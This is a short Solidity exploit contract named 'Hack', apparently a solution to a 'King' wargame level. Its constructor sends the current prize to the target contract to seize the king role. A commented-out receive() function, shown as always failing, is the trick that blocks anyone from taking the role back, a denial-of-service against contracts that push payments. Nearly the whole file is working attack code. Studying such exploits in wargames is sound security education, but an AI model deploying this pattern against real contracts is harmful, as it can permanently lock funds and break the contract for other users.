pragma solidity ^0.8;

interface IKing {
    function prize() external view returns (uint);
    function _king() external view returns (address);
}

contract Hack {
    constructor(address payable _target) payable {
        uint prize = IKing(_target).prize();
        // call King.receive()
        // use call and forward all gas
        (bool ok, ) = _target.call{value: prize}("");
        require(ok, "tx failed");
    }

    // receive() external payable {
    //     require(false, "always fail");
    // }
}